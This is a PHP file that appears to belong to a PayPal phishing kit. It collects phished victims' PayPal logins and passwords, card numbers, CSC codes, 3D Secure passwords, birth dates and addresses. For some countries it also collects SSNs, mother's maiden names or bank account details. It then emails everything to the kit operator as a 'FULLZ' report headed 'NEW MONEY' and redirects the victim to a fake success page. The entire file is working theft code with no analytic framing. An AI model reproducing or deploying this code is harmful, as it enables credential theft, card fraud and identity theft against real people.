<?php



session_start();
$time = date('d/m/Y G:i:s');
include('../config.php');
include('../get_browser.php');

$S_Z118 .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ Account PayPal FULLZ ####################<br>
<div>
<span style='font-size: 15px;'>################</span> <font style='color: #DF0000;' ><img src=\"http://img15.hostingpics.net/pics/951888ppl.png\" style='position: relative;top: 8px;'></font> <span style='font-size: 15px;'>####################</span></div>
<div>±±±±±±±±±±±±±±±±±[ LOGIN INFORMATION ]±±±±±±±±±±±±±±±±±±±±<br>
› [PP Email1]     = <font style='color:#0070ba;'>".$_SESSION['_login_email1_']."</font><br>
› [PP Password1]  = <font style='color:#0070ba;'>".$_SESSION['_login_password1_']."</font><br>
› [PP Email]     = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
› [PP Password]  = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
±±±±±±±±±±±±±±±±[ PEROSNAL INFORMATION ]±±±±±±±±±±±±±±±±±±<br>
› [Full Name]      = <font style='color:#0070ba;'>".$_SESSION['_fullName_']."</font><br>
› [Date Of Birth]  = <font style='color:#0070ba;'>".$_SESSION['_birth_date_']." Format (DD/MM/YYYY)</font><br>
› [Address line]   = <font style='color:#0070ba;'>".$_SESSION['_address_']."</font><br>
› [Country]        = <font style='color:#0070ba;'>".$_SESSION['_cntrcode_']."</font><br>
› [City]           = <font style='color:#0070ba;'>".$_SESSION['_city_']."</font><br>
› [State]          = <font style='color:#0070ba;'>".$_SESSION['_state_']."</font><br>
› [Zip Code]       = <font style='color:#0070ba;'>".$_SESSION['_zipCode_']."</font><br>
› [Phone Number]   = <font style='color:#0070ba;'>".$_SESSION['_phoneNumber_']."</font><br>
±±±±±±±±±±±±±±±±[ CARDING INFORMATION ]±±±±±±±±±±±±±±±±±±±<br>
› [Bank Name]      = <font style='color:#0070ba;'>".$_SESSION['_cc_bank_']."</font><br>
› [Type CC Number] = <font style='color:#0070ba;'>".$_SESSION['_ccglobal_']."</font><br>
› [C.C Level]      = <font style='color:#0070ba;'>".$_SESSION['_cc_class_']."</font><br>
› [Name On Card]   = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
› [Card Number]    = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']."</font><br>
› [CSC]	           = <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
› [Exp Date]       = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
±±±±±±±±±±±±±±±±±±[ VBV INFORMATION ]±±±±±±±±±±±±±±±±±±±±±<br>
› [Date Of Birth] = <font style='color:#0070ba;'>".$_SESSION['_birth_date_']." Format (DD/MM/YYYY)</font><br>
› [3D Secure]     = <font style='color:#0070ba;'>".$_SESSION['_password_vbv_']."</font><br>\n";
if ($_SESSION['_country_'] == "UNITED STATES") {
$S_Z118 .= "› [S.S.N]         = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>\n";}
if ($_SESSION['_country_'] == "GREECE") {
$S_Z118 .= "› [Official ID or passport]      = <font style='color:#0070ba;'>".$_SESSION['_offid_']."</font><br>\n";}
if ($_SESSION['_country_'] == "SWITZERLAND") {
$S_Z118 .= "› [Numero Du Compte]      = <font style='color:#0070ba;'>".$_SESSION['_accnumber_']."</font><br>\n";}
if ($_SESSION['_country_'] == "GERMANY") {
$S_Z118 .= "› [Numero Du Compte]      = <font style='color:#0070ba;'>".$_SESSION['_accnumber_']."</font><br>\n";}
if ($_SESSION['_country_'] == "CANADA" ) {
$S_Z118 .= "› [S.S.N]         = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>\n";
$S_Z118 .= "› [Mother Name]   = <font style='color:#0070ba;'>".$_SESSION['_mmname_']."</font><br>\n";
}
if ($_SESSION['_country_'] == "UNITED KINGDOM") {
$S_Z118 .= "› [Sort Code]     = <font style='color:#0070ba;'>".$_SESSION['_sortnum_']."</font><br>\n";
$S_Z118 .= "› [Account Numb]  = <font style='color:#0070ba;'>".$_SESSION['_accnumber_']."</font><br>\n";}
if ($_SESSION['_country_'] == "ITALY") {
$S_Z118 .= "› [Codice fiscale]     = <font style='color:#0070ba;'>".$_SESSION['_itt_']."</font><br>\n";
$S_Z118 .= "› [Numero cellulare]  = <font style='color:#0070ba;'>".$_SESSION['_itt1_']."</font><br>\n";}
if ($_SESSION['_country_'] == "IRELAND") {
$S_Z118 .= "› [Mother Name]   = <font style='color:#0070ba;'>".$_SESSION['_mmname_']."</font><br>\n";
$S_Z118 .= "› [Sort Code]     = <font style='color:#0070ba;'>".$_SESSION['_sortnum_']."</font><br>\n";
$S_Z118 .= "› [Account Numb]  = <font style='color:#0070ba;'>".$_SESSION['_accnumber_']."</font><br>\n";}
if($_SESSION['_country_'] == "AUSTRALIA") {
$S_Z118 .= "› [Credit Limits] = <font style='color:#0070ba;'>".$_SESSION['_creditlimit_']."</font><br>\n";
$S_Z118 .= "› [OSID]	      = <font style='color:#0070ba;'>".$_SESSION['_osid_']."</font><br>\n";}
$S_Z118 .= "
±±±±±±±±±±±±±±±±±±[ VBV INFORMATION ]±±±±±±±±±±±±±±±±±±±±±<br>
› [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font>
› [Country]        = <font style='color:#0070ba;'>".$_SESSION['_countryname_']."</font><br>
› [TIME]    = <font style='color:#0070ba;'>".$time."</font><br>
› [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## BY Mr Nekba #####################
</html></div>\n";

   $subject = "NEW MONEY | PPL/CC/VBV/FULL [".$_SESSION['_ccglobal_']."] [".$_SESSION['_ip_']."] [".$_SESSION['_countryname_']."]";
    $headers = "From:Mr ABR <webmaster>";
    $headers .= $_POST['eMailAdd']."\n";
    $headers .= "MIME-Version: 1.0\n";
	$headers .= "Content-type: text/html; charset=UTF-8\n";
	
        @mail($email, $subject, $S_Z118,$headers);
        header("Location: ../congratulations/?cmd=_session=".$_SESSION[_countrycode_]."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>